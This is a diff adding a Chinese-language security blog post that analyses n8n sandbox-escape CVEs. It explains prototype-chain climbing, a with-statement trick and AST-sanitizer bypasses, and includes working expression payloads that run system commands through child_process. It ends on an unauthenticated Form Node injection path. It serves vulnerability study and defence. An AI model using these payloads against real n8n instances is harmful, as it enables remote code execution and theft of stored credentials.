@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>n8n沙箱逃逸漏洞链分析：从原型链攀登到进程命令执行的完整逃逸路径 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>n8n沙箱逃逸漏洞链分析：从原型链攀登到进程命令执行的完整逃逸路径</h1>
+<time>2026-08-03</time>
+<ul>
+<li>技术
+Slug: n8n沙箱逃逸漏洞链分析-从原型链攀登到进程命令执行的完整逃逸路径</li>
+</ul>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究、漏洞复现验证与防御体系建设参考。所有 PoC 代码均基于已公开披露的漏洞信息编写，仅可在<strong>授权环境</strong>与<strong>本地隔离实验环境</strong>中使用。严禁将本文提供的任何技术细节、利用代码用于未经授权的真实系统攻击。读者应遵守所在地区的网络安全法律法规，因不当使用本文内容造成的一切后果由使用者自行承担。文中涉及的 CVE 编号及漏洞细节均来自公开安全披露渠道，相关漏洞已在最新版本中修复，建议及时升级至安全版本。</p>
+<hr />
+<h2>概述</h2>
+<h3>n8n 工作流引擎背景</h3>
+<p>n8n 是一款广受欢迎的开源工作流自动化工具，采用节点式（node-based）可视化编排模型，允许用户将 SaaS 服务、数据库、消息队列、AI 模型等各类系统串联成自动化流水线。截至目前，n8n 已被全球超过 23 万个组织采用，Docker Hub 累计拉取量超过 1 亿次，是低代码自动化赛道的核心基础设施之一。</p>
+<p>n8n 的核心能力之一是<strong>表达式引擎</strong>：用户可以在节点配置中使用 <code>={{ }}</code> 语法嵌入 JavaScript 表达式，实现数据在节点间的动态流转、条件判断与格式转换。这种在低代码平台中嵌入图灵完备语言的设计带来了极大的灵活性，但也引入了一个根本性的安全张力——<strong>用户提交的 JavaScript 代码需要在服务端被执行，而执行环境必须将其与宿主进程隔离</strong>。</p>
+<p>为了实现这种隔离，n8n 早期版本依赖 VM2 沙箱（以及后来 n8n 自维护的 <code>@n8n/vm2</code> 分支）来执行用户表达式。VM2 是一个构建在 Node.js <code>vm</code> 模块之上的增强型沙箱库，曾被大量 Node.js 项目用于执行不可信代码。</p>
+<h3>沙箱逃逸漏洞概述</h3>
+<p>本文分析的核心问题在于：VM2 沙箱及其后续的 AST 消毒机制存在多个可被绕过的逃逸路径。攻击者只需在 n8n 表达式注入点（如工作流节点参数、表单字段）中提交特制的 JavaScript payload，便能突破沙箱隔离边界，获取宿主 Node.js 进程的 <code>process</code> 对象，进而通过 <code>process.mainModule.require('child_process')</code> 以 n8n 进程身份执行任意系统命令。</p>
+<p>由于 n8n 进程通常以较高权限运行，且长期持有所有连接系统的凭证（数据库密码、API 密钥、OAuth 令牌等），一旦实现 RCE，攻击者即可读取加密主密钥、解密全部存储凭证，完成对整个自动化生态的接管。</p>
+<h3>影响版本范围</h3>
+<table>
+<thead>
+<tr>
+<th>漏洞编号</th>
+<th>逃逸技术</th>
+<th>影响范围</th>
+<th>修复版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-68613</td>
+<td>原型链攀登（constructor.constructor）</td>
+<td>n8n &lt; 1.122.0</td>
+<td>1.122.0</td>
+</tr>
+<tr>
+<td>CVE-2026-1470</td>
+<td>with 语句欺骗</td>
+<td>VM2 ≤ 3.9.19 系列</td>
+<td>VM2 弃用，迁移 isolated-vm</td>
+</tr>
+<tr>
+<td>CVE-2026-27495</td>
+<td>AST 解构/SpreadElement 绕过</td>
+<td>n8n &lt; 1.123.17 / 2.0.0–2.5.1</td>
+<td>1.123.17 / 2.5.2</td>
+</tr>
+</tbody>
+</table>
+<p>三个漏洞并非孤立的点状缺陷，而是一条层层递进的逃逸链：CVE-2025-68613 揭示了原型链这一根本攻击面；其补丁引入了 AST 层面的消毒器试图封堵该路径；CVE-2026-1470 展示了 with 语句这一语言级特性对 Proxy 拦截的旁路；CVE-2026-27495 则证明仅靠 AST 节点类型枚举无法覆盖 JavaScript 全部语法变体，解构赋值与箭头函数的组合可击穿全部防御层。</p>
+<hr />
+<h2>n8n 沙箱机制剖析</h2>
+<h3>表达式引擎架构</h3>
+<p>n8n 的表达式引擎经历了从 VM2 到自研 AST 消毒器、再到 isolated-vm 的演进。理解其架构是理解逃逸路径的前提。</p>
+<p><strong>表达式语法与求值流程</strong></p>
+<p>n8n 表达式使用 <code>={{ }}</code> 包裹 JavaScript 代码片段。例如：</p>
+<div class="highlight"><pre><span></span><code><span class="x">=</span><span class="cp">{{</span> <span class="err">$</span><span class="nv">input.first</span><span class="o">()</span><span class="nv">.json.email</span> <span class="cp">}}</span>
+<span class="x">=</span><span class="cp">{{</span> <span class="err">$</span><span class="nv">json.price</span> <span class="o">*</span> <span class="m">1.2</span> <span class="cp">}}</span>
+<span class="x">=</span><span class="cp">{{</span> <span class="err">$</span><span class="nv">now.toISO</span><span class="o">()</span> <span class="cp">}}</span>
+</code></pre></div>
+
+<p>在运行时，表达式引擎的处理流程如下：</p>
+<ol>
+<li><strong>表达式提取</strong>：扫描节点参数中的 <code>{{ }}</code> 模式，提取内部代码字符串。</li>
+<li><strong>编译</strong>：通过 <code>@n8n/tournament</code> 编译器将表达式字符串解析为 JavaScript AST。</li>
+<li><strong>AST 消毒</strong>：在 AST 构建过程中注入安全钩子（sanitizer hooks），遍历 AST 检测并拦截危险模式。</li>
+<li><strong>沙箱执行</strong>：将消毒后的代码在受限的 VM 上下文中执行，返回求值结果。</li>
+</ol>
+<p><strong>VM2 沙箱设计（早期版本）</strong></p>
+<p>在 n8n 1.122.0 之前，表达式执行依赖 VM2 沙箱。VM2 的设计目标是：在同一 Node.js 进程内安全执行不可信代码，使其无法访问宿主环境的全局对象。VM2 声称提供了以下安全特性：</p>
+<ul>
+<li>基于白名单的 Node.js 内置模块访问控制</li>
+<li>对 <code>process</code> 对象方法的受限暴露</li>
+<li>对沙箱 console 输出的完全控制</li>
+<li>单进程内的代码隔离</li>
+</ul>
+<p>然而，这些特性建立在一个脆弱的基础上——VM2 使用源码到源码的转换器（source-to-source transformer）和 Proxy 拦截来"修补"JavaScript 语言中所有可能逃逸的路径。这种"打补丁式"的安全模型注定是军备竞赛，因为 JavaScript 语言的动态特性提供了几乎无穷的旁路可能性。</p>
+<h3>VM2 沙箱的隔离原理</h3>
+<p><strong>基于 Node.js vm 模块的增强隔离</strong></p>
+<p>Node.js 原生的 <code>vm</code> 模块提供了 <code>vm.runInNewContext(code, sandbox)</code> API，可在新的 V8 上下文中执行代码。但 Node.js 官方文档明确警告：<strong>vm 模块不是安全机制，它只是一个作用域机制，不能用于执行不可信代码</strong>。</p>
+<p>原因在于：<code>vm</code> 创建的沙箱上下文中的对象，其原型链仍然连接到 V8 引擎的全局构造器。只要攻击者能从沙箱内的任意对象出发，沿着原型链攀登，就能到达沙箱外的 <code>Function</code> 构造器，从而获得在宿主上下文中执行任意代码的能力。例如：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">sandbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
+<span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">sandbox</span><span class="p">);</span>
+<span class="c1">// 直接返回宿主的 process 对象，沙箱形同虚设</span>
+</code></pre></div>
+
+<p>VM2 的增强措施正是为了阻断这条原型链路径。VM2 在代码执行前对其进行 AST 转换，将所有可能触及原型链的访问点替换为安全代理。</p>
+<p><strong>Proxy 拦截机制</strong></p>
+<p>VM2 的核心防御是使用 ES6 Proxy 对象包装沙箱内的全局对象与原型链节点。Proxy 的 handler 拦截器会检查每一次属性访问、<code>in</code> 操作、<code>getPrototypeOf</code> 调用，当检测到对 <code>constructor</code>、<code>__proto__</code>、<code>prototype</code> 等危险属性的访问时，返回一个受控的代理对象而非真实的宿主构造器。</p>
+<p>例如，当沙箱代码执行 <code>obj.constructor</code> 时，Proxy 的 <code>get</code> trap 会拦截这次访问，返回一个被"neutralize"（中和）的函数，而非宿主的 <code>Object.constructor</code>（即 <code>Function</code>）。这样，<code>obj.constructor.constructor</code> 得到的就不是一个能 <code>return process</code> 的真实 Function，而是一个无害的包装。</p>
+<p><strong>全局对象遮蔽</strong></p>
+<p>VM2 还通过"遮蔽"（shadowing）技术，在沙箱上下文中用安全替代品替换危险全局对象。沙箱内的 <code>Function</code>、<code>eval</code>、<code>process</code>、<code>require</code>、<code>global</code>、<code>globalThis</code> 等都被替换为受限版本或空对象。理论上，只要沙箱代码无法绕过这些遮蔽，就无法触及宿主的真实全局对象。</p>
+<p>这套隔离体系的设计逻辑是严密的，但其致命弱点在于：<strong>JavaScript 语言规范提供了太多隐式的属性解析路径，Proxy 拦截器不可能枚举并覆盖全部</strong>。后续的每一个逃逸漏洞，本质上都是找到了一条 VM2 设计者未曾考虑到的属性解析旁路。</p>
+<hr />
+<h2>漏洞链分析</h2>
+<h3>CVE-2025-68613：原型链攀登逃逸</h3>
+<p><strong>漏洞根因</strong></p>
+<p>CVE-2025-68613（CVSS 10.0）是 n8n 表达式引擎沙箱逃逸系列漏洞的开端。其根因在于：n8n 早期版本直接使用 Node.js 原生 <code>vm</code> 模块或早期 VM2 执行用户表达式，而沙箱上下文中暴露的对象（如工作流数据 <code>$json</code>、<code>$input</code> 等）通过原型链隐式连接到宿主环境的对象图。</p>
+<p>更关键的是，VM2 的 Proxy 拦截在某些代码路径下存在盲区。当沙箱代码通过 <code>this</code> 关键字访问当前执行上下文时，<code>this</code> 指向的沙箱 context 对象的原型链未被完全代理，导致 <code>this.constructor.constructor</code> 这条经典攀登路径直达宿主的 <code>Function</code> 构造器。</p>
+<p><strong>原型链访问路径分析</strong></p>
+<p>逐步拆解原型链攀登过程：</p>
+<ol>
+<li>
+<p><strong><code>this</code></strong>：在 n8n 表达式执行上下文中，<code>this</code> 指向沙箱的 context 对象（即 <code>vm.createContext()</code> 创建的对象）。该对象在 V8 内部由宿主上下文的 <code>Object</code> 构造器创建。</p>
+</li>
+<li>
+<p><strong><code>this.constructor</code></strong>：访问 context 对象的 <code>constructor</code> 属性。由于 context 对象的原型是 <code>Object.prototype</code>，<code>Object.prototype.constructor</code> 指向 <code>Object</code> 构造器。在 VM2 的 Proxy 体系下，这一步本应返回中和后的代理对象，但在特定路径下拦截失效，返回了沙箱上下文内的 <code>Object</code> 构造器。</p>
+</li>
+<li>
+<p><strong><code>this.constructor.constructor</code></strong>：访问 <code>Object</code> 构造器的 <code>constructor</code> 属性。函数对象的 <code>constructor</code> 属性指向 <code>Function</code> 构造器。由于 <code>Object</code> 本身是一个函数，<code>Object.constructor === Function</code>。这里得到的 <code>Function</code> 是<strong>宿主上下文</strong>的 <code>Function</code> 构造器——它创建的函数在宿主上下文中执行，不受沙箱约束。</p>
+</li>
+<li>
+<p><strong><code>Function("return process")()</code></strong>：用宿主 <code>Function</code> 构造器创建一个返回 <code>process</code> 的函数并立即调用。由于该函数在宿主上下文中执行，<code>process</code> 解析为宿主全局的 <code>process</code> 对象。沙箱被彻底突破。</p>
+</li>
+</ol>
+<p><strong>PoC 代码</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// CVE-2025-68613 原型链攀登逃逸 PoC</span>
+<span class="c1">// 注入到 n8n 表达式字段中执行</span>
+<span class="p">{{</span>
+<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// Step 1: 沿原型链攀登，获取宿主上下文的 Function 构造器</span>
+<span class="w">    </span><span class="c1">// this -&gt; 沙箱 context 对象</span>
+<span class="w">    </span><span class="c1">// this.constructor -&gt; Object（沙箱内）</span>
+<span class="w">    </span><span class="c1">// this.constructor.constructor -&gt; 宿主 Function 构造器</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">HostFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="kr">constructor</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Step 2: 用宿主 Function 创建一个返回 process 的闭包</span>
+<span class="w">    </span><span class="c1">// 该函数在宿主上下文执行，不受沙箱限制</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">getProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HostFunction</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// Step 3: 执行获取宿主 process 对象</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getProcess</span><span class="p">();</span>
+
+<span class="w">    </span><span class="c1">// Step 4: 通过 process.mainModule.require 加载 child_process</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">require</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">proc</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Step 5: 以 n8n 进程身份执行系统命令</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id; whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
+<span class="p">})()</span>
+<span class="p">}}</span>
+</code></pre></div>
+
+<p>该 payload 在 n8n 工作流编辑器的"Set"节点变量值、HTTP Request 节点的 Header 值等支持表达式求值的位置均可触发。攻击者将上述表达式作为节点参数提交，当工作流执行到该节点时，表达式引擎在沙箱中求值，payload 突破沙箱后以 n8n 进程身份执行了 <code>id</code> 和 <code>whoami</code> 命令。</p>
+<p><strong>绕过静态过滤的变体</strong></p>
+<p>当管理员尝试用正则过滤 <code>constructor</code>、<code>process</code>、<code>require</code> 等关键字时，JavaScript 的动态特性使绕过变得极其简单：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 通过字符串拼接与方括号访问绕过关键字过滤</span>
+<span class="p">{{</span>
+<span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;con&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;structor&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;pro&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;cess&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">HostFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">];</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HostFunction</span><span class="p">(</span><span class="s1">&#39;return &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p</span><span class="p">)();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">proc</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;_process&#39;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+<span class="p">})()</span>
+<span class="p">}}</span>
+</code></pre></div>
+
+<p>这种变体说明，对解释型语言进行基于关键字的静态过滤是徒劳的——攻击者总能在运行时动态构造被过滤的字符串。</p>
+<h3>CVE-2026-1470：with 语句欺骗逃逸</h3>
+<p><strong>with 语句沙箱绕过原理</strong></p>
+<p>CVE-2026-1470 展示了一种截然不同的逃逸思路：利用 JavaScript 的 <code>with</code> 语句修改作用域链，使属性解析绕过 VM2 的 Proxy 拦截，直达宿主上下文的 <code>Function.prototype.constructor</code>。</p>
+<p><code>with</code> 语句是 JavaScript 中一个鲜少使用但语义特殊的语句。它将一个对象添加到作用域链的<strong>最前端</strong>，使得在该语句块内，所有标识符的解析都会<strong>先检查 with 对象及其原型链</strong>，再检查正常的词法作用域。这个语义特性创造了一条 VM2 Proxy 未覆盖的属性解析旁路。</p>
+<p>VM2 的 Proxy 拦截器部署在沙箱全局对象和特定原型链节点上。当沙箱代码通过正常路径访问 <code>constructor</code> 时，Proxy 的 <code>get</code> trap 会拦截。但 <code>with</code> 语句将一个<strong>新的对象</strong>（这里是匿名函数）推入作用域链前端，使得标识符 <code>constructor</code> 的解析走的是<strong>作用域链查找</strong>而非<strong>对象属性访问</strong>——这两者在 V8 内部的解析路径不同，Proxy 的 <code>get</code> trap 并不会被作用域链查找触发。</p>
+<p><strong>关键 PoC 代码</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// CVE-2026-1470 with 语句沙箱逃逸</span>
+<span class="p">{{</span><span class="w"> </span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="w"> </span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="kr">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;gotcha&#39;</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="kd">with</span><span class="p">(</span><span class="kd">function</span><span class="p">(){}){</span><span class="w"> </span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kr">constructor</span><span class="p">(</span><span class="s2">&quot;return process&quot;</span><span class="p">)()</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="p">})()</span><span class="w"> </span><span class="p">}}</span>
+</code></pre></div>
+
+<p>逐层拆解这个精巧的 payload：</p>
+<ol>
+<li>
+<p><strong><code>var constructor = 'gotcha'</code></strong>：在函数作用域中声明一个名为 <code>constructor</code> 的局部变量，赋值为字符串 <code>'gotcha'</code>。这看似是一个"无用"的声明，实则是整个逃逸的关键铺垫——它用于证明标识符解析<strong>没有</strong>走正常的词法作用域，而是被 <code>with</code> 语句劫持。</p>
+</li>
+<li>
+<p><strong><code>with(function(){})</code></strong>：<code>with</code> 语句接收一个匿名函数对象 <code>function(){}</code>。在 JavaScript 中，函数是一等对象，具有原型链：<code>function(){}</code> → <code>Function.prototype</code> → <code>Object.prototype</code>。<code>with</code> 将这个函数对象推入作用域链最前端。</p>
+</li>
+<li>
+<p><strong><code>constructor</code> 标识符解析</strong>：在 <code>with</code> 块内引用 <code>constructor</code> 时，JavaScript 引擎按以下顺序解析：</p>
+</li>
+<li><strong>第一步</strong>：检查 <code>with</code> 对象（匿名函数）自身的属性——函数对象自身没有 <code>constructor</code> 属性。</li>
+<li><strong>第二步</strong>：沿 <code>with</code> 对象的原型链查找——<code>Function.prototype.constructor</code> 存在，其值是 <strong><code>Function</code> 构造器</strong>。</li>
+<li><strong>第三步（不会到达）</strong>：如果前两步未命中，才会查找词法作用域中的 <code>var constructor = 'gotcha'</code>。</li>
+</ol>
+<p>由于 <code>Function.prototype.constructor === Function</code>，<code>constructor</code> 解析为宿主上下文的 <code>Function</code> 构造器，<strong>完全绕过了局部变量 <code>var constructor = 'gotcha'</code> 和 VM2 的 Proxy 拦截</strong>。</p>
+<ol>
+<li>
+<p><strong><code>constructor("return process")</code></strong>：等价于 <code>Function("return process")</code>，创建一个在宿主上下文中执行的函数。</p>
+</li>
+<li>
+<p><strong><code>()</code></strong>：立即调用，返回宿主的 <code>process</code> 对象。</p>
+</li>
+</ol>
+<p>整个逃逸过程的精妙之处在于：VM2 的 Proxy 拦截器部署在对象的属性访问层，而 <code>with</code> 语句触发的标识符解析发生在<strong>作用域链层</strong>——这是一个 V8 引擎内部更深层的解析路径，Proxy 的 <code>get</code> trap 对此无能为力。这就是为什么明明有 <code>var constructor = 'gotcha'</code> 这个局部变量，<code>constructor</code> 却解析到了 <code>Function</code>——因为 <code>with</code> 对象的原型链查找优先级高于词法作用域的变量查找。</p>
+<p>这个漏洞揭示了沙箱设计的一个深层教训：<strong>Proxy 只能拦截显式的属性访问操作，无法拦截作用域链隐式的标识符解析</strong>。只要 JavaScript 语言保留了 <code>with</code> 这样能操纵作用域链的语句，基于 Proxy 的沙箱就存在结构性盲区。</p>
+<h3>CVE-2026-27495：AST 绕过逃逸</h3>
+<p><strong>抽象语法树层面的绕过</strong></p>
+<p>CVE-2025-68613 披露后，n8n 引入了多层 AST 消毒器试图封堵原型链逃逸路径。CVE-2026-27495 证明了这些基于 AST 节点类型枚举的消毒器存在根本性缺陷：<strong>同一种语义操作（访问对象属性）可以通过不同的 JavaScript 语法产生完全不同的 AST 节点类型，而消毒器只检查了其中部分类型</strong>。</p>
+<p><strong>沙箱编译器缺陷分析</strong></p>
+<p>n8n 的 AST 消毒器（以 PrototypeSanitizer 为核心）部署了以下防御层：</p>
+<ol>
+<li>
+<p><strong>正则校验层</strong>：对原始表达式字符串执行 <code>/\.\s*constructor/gm</code> 正则匹配，拦截 <code>.constructor</code> 的点号访问。</p>
+</li>
+<li>
+<p><strong>PrototypeSanitizer（AST 运行时消毒器）</strong>：遍历 AST，检查 <strong>MemberExpression</strong> 节点（即 <code>obj.prop</code> 或 <code>obj['prop']</code>），当被访问属性出现在 <code>constructor</code>、<code>__proto__</code>、<code>prototype</code>、<code>mainModule</code>、<code>binding</code> 等黑名单中时进行拦截或包装。</p>
+</li>
+<li>
+<p><strong>FunctionThisSanitizer</strong>：拦截立即执行函数表达式（IIFE），将其 <code>this</code> 绑定到空对象，防止 <code>this</code> 泄露全局 <code>process</code> 对象。但该消毒器<strong>只处理 FunctionExpression 节点</strong>，对 ArrowFunctionExpression（箭头函数）直接跳过。</p>
+</li>
+</ol>
+<p>这三个消毒层的共同假设是：<strong>属性访问只通过点号（<code>obj.constructor</code>）或方括号（<code>obj['constructor']</code>）发生，且函数执行上下文的 <code>this</code> 绑定只在 FunctionExpression 中需要处理</strong>。这个假设是错误的。</p>
+<p><strong>解构赋值绕过</strong></p>
+<p>JavaScript 的解构赋值语法提供了一种完全不同的属性提取方式：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 传统访问 —— 产生 MemberExpression 节点，被消毒器拦截</span>
+<span class="nx">obj</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span>
+
+<span class="c1">// 解构赋值 —— 产生 ObjectPattern → Property 节点，消毒器不检查</span>
+<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">constructor</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">;</span>
+</code></pre></div>
+
+<p>两种写法语义完全相同（都提取了 <code>obj</code> 的 <code>constructor</code> 属性），但产生的 AST 结构截然不同。解构赋值产生的是 <code>VariableDeclaration</code> → <code>ObjectPattern</code> → <code>Property</code> 节点链，而 PrototypeSanitizer 只遍历 <code>MemberExpression</code> 节点。因此，解构赋值路径上的 <code>constructor</code> 属性提取<strong>完全不在消毒器的检查范围内</strong>。</p>
+<p><strong>箭头函数绕过</strong></p>
+<p>FunctionThisSanitizer 通过重写 IIFE 来绑定安全的 <code>this</code>，但它只识别 <code>FunctionExpression</code> 节点。箭头函数产生 <code>ArrowFunctionExpression</code> 节点，消毒器对其直接返回不做处理。由于箭头函数<strong>不绑定自己的 <code>this</code></strong>，而是从外层词法作用域继承 <code>this</code>，这为攻击者提供了一个 <code>this</code> 未被消毒的执行上下文。</p>
+<p><strong>组合 PoC</strong></p>
+<p>将解构赋值与箭头函数组合，可同时绕过全部三层防御：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// CVE-2026-27495 AST 解构 + 箭头函数绕过 PoC</span>
+<span class="p">{{</span>
+<span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 箭头函数 —— 绕过 FunctionThisSanitizer（只处理 FunctionExpression）</span>
+<span class="w">    </span><span class="c1">// this 从外层继承，未被绑定到空对象</span>
+
+<span class="w">    </span><span class="c1">// 解构赋值 —— 绕过 PrototypeSanitizer（只检查 MemberExpression）</span>
+<span class="w">    </span><span class="c1">// 从箭头函数实例中提取 Function 构造器</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">constructor</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{};</span>
+
+<span class="w">    </span><span class="c1">// constructor 现在是宿主的 Function 构造器</span>
+<span class="w">    </span><span class="c1">// 动态构造并执行代码，获取 process 对象</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kr">constructor</span><span class="p">(</span>
+<span class="w">        </span><span class="s1">&#39;return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()&#39;</span>
+<span class="w">    </span><span class="p">)();</span>
+<span class="p">})()</span>
+<span class="p">}}</span>
+</code></pre></div>
+
+<p><strong>SpreadElement 绕过变体</strong></p>
+<p>另一种 AST 层面的绕过利用了展开运算符（spread syntax）。VariablePolyfill Transformer 维护了一个包含 130 余种 AST 节点类型的检查列表，用于判断危险标识符出现的上下文是否安全。然而，<strong><code>SpreadElement</code> 节点类型不在检查列表中</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SpreadElement 绕过 —— process 出现在展开元素位置</span>
+<span class="c1">// AST: ObjectExpression → SpreadElement → Identifier(process)</span>
+<span class="c1">// Transformer 的 switch-case 中没有 SpreadElement 分支，落入 default 不做重写</span>
+<span class="p">{{</span>
+<span class="p">((</span><span class="nx">g</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span>
+<span class="w">    </span><span class="nx">g</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+<span class="p">)({...</span><span class="nx">process</span><span class="p">})</span>
+<span class="p">}}</span>
+</code></pre></div>
+
+<p><code>{...process}</code> 中的 <code>process</code> 标识符位于 <code>SpreadElement</code> 的 <code>argument</code> 位置。Transformer 遍历到该 Identifier 时，检查其父节点类型为 <code>SpreadElement</code>，但 switch-case 中无此分支，落入 <code>default</code> 不执行任何重写。于是 <code>process</code> 被原样保留为真实的 Node.js 全局对象，后续通过 <code>getBuiltinModule</code> 直接加载 <code>child_process</code> 模块。</p>
+<p>这三种 AST 绕过的共同模式是：<strong>安全检查基于 AST 节点类型的枚举，而 JavaScript 语法的多样性保证了总有未被枚举的节点类型存在</strong>。只要消毒器的覆盖策略是"白名单式枚举"而非"黑名单式默认拒绝"，就必然存在遗漏。</p>
+<hr />
+<h2>完整逃逸链复现</h2>
+<h3>从表达式注入到 RCE</h3>
+<p>将上述逃逸技术串联，可构成从表达式注入点到 RCE 的完整攻击链。</p>
+<p><strong>第一步：表达式注入点发现</strong></p>
+<p>n8n 中支持表达式求值的位置非常广泛，包括但不限于：</p>
+<ul>
+<li>Set 节点 / Edit Fields 节点的值字段</li>
+<li>HTTP Request 节点的 URL、Header、Body 字段</li>
+<li>Form Node 的 HTML 字段配置（存在双重求值，详见下文）</li>
+<li>任何节点的参数中包含 <code>={{ }}</code> 语法的位置</li>
+</ul>
+<p>其中，Form Node 的<strong>双重求值</strong>（double evaluation）机制提供了未认证的注入入口：</p>
+<ul>
+<li><strong>Pass 1</strong>：Form Node 渲染表单时，通过 <code>getNodeParameter()</code> 求值配置中的表达式，将用户之前提交的字段值注入 HTML。</li>
+<li><strong>Pass 2</strong>：<code>prepareFormFields()</code> 调用 <code>getResolvables()</code> 扫描渲染后 HTML 中的 <code>{{ }}</code> 模式，对每个匹配模式再次调用 <code>evaluateExpression()</code> 执行第二次求值。</li>
+</ul>
+<p>如果攻击者在表单字段中提交 <code>{{ EVIL_PAYLOAD }}</code>，该内容在 Pass 1 被原样注入 HTML，在 Pass 2 被引擎当作合法表达式执行。由于 Form Node 的 <code>/form/*</code> 端点在设计上无需认证，攻击者只需向公开表单发送一个 POST 请求即可触发注入，实现<strong>未认证、零点击</strong>的 RCE 前置条件。</p>
